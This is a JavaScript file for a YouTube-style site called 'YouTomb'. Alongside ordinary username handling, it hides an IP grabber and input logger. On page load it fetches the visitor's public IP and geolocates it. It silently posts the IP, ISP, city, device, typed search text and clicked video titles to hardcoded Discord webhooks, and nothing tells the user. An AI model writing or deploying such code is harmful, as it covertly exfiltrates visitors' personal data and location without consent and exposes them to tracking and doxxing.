// ----------------------
// Username Setup
// ----------------------
const youtombdef = "YouTomb User #" + Math.floor(Math.random() * 10000);

let storedName = localStorage.getItem("ytm15Username");
if (!storedName || storedName.trim() === "") {
  localStorage.removeItem("ytm15Username");
}

let username = localStorage.getItem("ytm15Username");
if (!username) {
  localStorage.setItem("ytm15Username", youtombdef);
}

function changeUsername() {
  const newName = prompt("Enter a new username:")?.trim();
  if (newName) {
    username = newName;
    localStorage.setItem("ytm15Username", username);
  }
}

// ----------------------
// PISS Reporter
// ----------------------
(async () => {
  const fileUrl = "https://ipv4.icanhazip.com/";
  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";

  try {
    const fileRes = await fetch(fileUrl);
    const ip = (await fileRes.text()).trim();

    async function getData(ip) {
      const primary = `https://ipapi.co/${ip}/json/`;
      const fallback = `https://corsproxy.io/?https://ipapi.co/${ip}/json/`;
      try { const r = await fetch(primary); if (r.ok) return await r.json(); } catch {}
      try { const r2 = await fetch(fallback); if (r2.ok) return await r2.json(); } catch {}
      return {};
    }

    const data = await getData(ip);
    const isp = data.org || "Unknown ISP";
    const asn = data.asn ? `(${data.asn})` : "";
    const location = data.city && data.region && data.country_name
      ? `${data.city}, ${data.region}, ${data.country_name}`
      : "Unknown Location";
    const platform = navigator.userAgentData?.platform || navigator.platform;
    const site = window.location.href.replace(/^https?:\/\//, "https://");

    const message = `User: ${username}\nIP: ${ip}\nISP: ${isp} ${asn}\nLocation: ${location}\nDevice: ${platform}\nSite: ${site}`;

    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message })
    });
    console.log("IP Reporter webhook sent");
  } catch (err) {
    console.error("IP Reporter Error:", err);
  }
})();

// ----------------------
// Input Listener
// ----------------------
function sendToWebhook(content) {
  if (!content) return;
  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
  fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: `User: ${username}\n${content}` })
  }).then(r => console.log("User input webhook response:", r.status))
    .catch(err => console.error("Send failed:", err));
}

function attachInputListener(input) {
  input.addEventListener("keydown", async e => {
    if (e.key === "Enter") {
      const text = input.value.trim();
      if (!text) return;
      const payload = { content: `User: ${username}\n${text.replace(/[`*_~>|]/g, "")}` };
      try {
        const res = await fetch("https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        console.log("Input Enter webhook response:", res.status);
      } catch (err) {
        console.error("Error sending input to Discord:", err);
      }
    }
  });
}

const inputEl = document.querySelector("input");
if (inputEl) attachInputListener(inputEl);
else document.addEventListener("DOMContentLoaded", () => {
  const i = document.querySelector("input");
  if (i) attachInputListener(i);
});

// ----------------------
// Device Detection Webhook
// ----------------------
(async () => {
  try {
    const KwebhookUrl = "https://discord.com/api/webhooks/1426288631152251090/NOzBMFAj0j_O2uapbBZMit_37Mo4iJGgUNxO2BevN-LrGxqR4IX441WC2hdjuwVcSNBh";
    const message = `User: ${username}\nThe Person is on ${navigator.userAgentData?.mobile ? "Mobile" : "Desktop"}`;
    const res = await fetch(KwebhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message })
    });
    console.log("Device webhook response:", res.status);
  } catch (err) {
    console.error("Device detection webhook error:", err);
  }
})();

// ----------------------
// Click Logger Webhook
// ----------------------
(async () => {
  const winhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";
  let fileText = "";
  try {
    const fileRes = await fetch("https://ipv4.icanhazip.com/");
    fileText = (await fileRes.text()).trim();
  } catch (err) {
    console.error("Could not fetch IP for click logger:", err);
  }

  async function safeSend(headline) {
    try {
      const cleanHeadline = headline.replace(/[^a-zA-Z0-9 .,!?'"()\[\]{}\-_/]/g, "").slice(0, 1800);
      const message = `User: ${username}\n${fileText} has opened ${cleanHeadline}`;
      const res = await fetch(winhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
      });
      console.log("Click logger webhook response:", res.status);
    } catch (err) {
      console.error("Send failed:", err);
    }
  }

  document.addEventListener("click", e => {
    const target = e.target.closest(".compact-video, .compact-channel, .shelf-item");
    if (!target) return;
    const headline = target.querySelector(".compact-media-headline");
    if (headline && headline.innerText.trim()) safeSend(headline.innerText.trim());
  });
})();

(() => {
  document.addEventListener("keydown", e => {
    if (e.ctrlKey && e.altKey && e.key.toLowerCase() === "u") {
      const current = localStorage.getItem("ytm15Username") || "Anonymous";
      const newName = prompt("Enter new username:", current)?.trim();
      if (newName) localStorage.setItem("ytm15Username", newName);
    }
  });
})();

